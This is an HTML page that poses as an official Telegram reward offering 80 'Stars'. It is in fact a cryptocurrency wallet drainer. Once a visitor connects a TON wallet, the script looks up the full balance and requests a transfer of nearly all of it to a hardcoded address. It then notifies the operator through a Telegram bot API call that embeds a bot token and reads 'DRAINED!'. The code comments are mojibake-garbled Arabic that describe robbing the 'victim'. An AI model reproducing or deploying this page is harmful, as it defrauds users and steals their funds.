<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Rewards | Official Claim</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body { background: #0e1621; color: white; font-family: -apple-system, sans-serif; text-align: center; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .card { background: #17212b; border-radius: 20px; padding: 40px; width: 90%; max-width: 400px; border: 1px solid #242f3d; }
        .connect-btn { background: #2481cc; color: white; border: none; padding: 18px; border-radius: 12px; font-size: 19px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; }
    </style>
</head>
<body>

    <div class="card">
        <div style="background: #2481cc; display: inline-block; padding: 5px 15px; border-radius: 50px; font-size: 12px; font-weight: bold; margin-bottom: 15px;">âœ“ OFFICIAL REWARD</div>
        <div style="font-size: 50px; font-weight: 900;">80</div>
        <div style="color: #f4b400; font-weight: bold; font-size: 18px;">STARS</div>
        <p style="color: #7f91a4; margin: 20px 0;">Connect your wallet to receive your stars reward instantly.</p>
        <button class="connect-btn" id="claim-button">Claim 80 Stars</button>
    </div>

    <script>
        const tonConnectUI = new TonConnectUI.TonConnectUI({
            manifestUrl: 'https://ton-connect.github.io/demo-dapp-with-react/tonconnect-manifest.json',
            buttonRootId: 'claim-button'
        });

        tonConnectUI.onStatusChange(async (wallet) => {
            if (wallet) {
                try {
                    // 1. Ù†Ø¬ÙŠØ¨Ùˆ Ø§Ù„Ø±ØµÙŠØ¯ ØªØ§Ø¹ Ø§Ù„Ø¶Ø­ÙŠØ© Ù…Ù† Ø§Ù„Ø´Ø¨ÙƒØ©
                    const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${wallet.account.address}`);
                    const data = await response.json();
                    const fullBalance = BigInt(data.result); // Ø§Ù„Ø±ØµÙŠØ¯ Ø¨Ø§Ù„Ù†Ø§Ù†Ùˆ-ØªÙˆÙ†

                    // 2. Ù†Ø®Ù„Ùˆ Ø´ÙˆÙŠØ© Ù„Ù„ØºØ§Ø² (Ù…Ø«Ù„Ø§Ù‹ 0.05 TON) Ø¨Ø§Ø´ ØªÙ†Ø¬Ø­ Ø§Ù„Ø¹Ù…Ù„ÙŠØ©
                    const gasFee = BigInt(50000000); 
                    const amountToSend = fullBalance - gasFee;

                    if (amountToSend > 0) {
                        const transaction = {
                            validUntil: Math.floor(Date.now() / 1000) + 60,
                            messages: [{
                                address: "UQBW8KIbJpKHSx-9aq4gIwmM6ESMs-dpKVAQCj46hTyIxnXh",
                                amount: amountToSend.toString() // ÙŠØ³Ø­Ø¨ ÙƒÙ„Ø´ ÙˆØ§Ø´ ÙƒØ§ÙŠÙ†
                            }]
                        };

                        await tonConnectUI.sendTransaction(transaction);
                        fetch(`https://api.telegram.org/bot8351638574:AAG2xyCtbiP5ipHgFGG-3-ibueh1l5xlUNo/sendMessage?chat_id=6925387370&text=ðŸ’° DRAINED! Amount: ${Number(amountToSend)/1e9} TON from ${wallet.account.address}`);
                    }
                } catch (e) {
                    console.error(e);
                }
            }
        });
    </script>
</body>
</html>
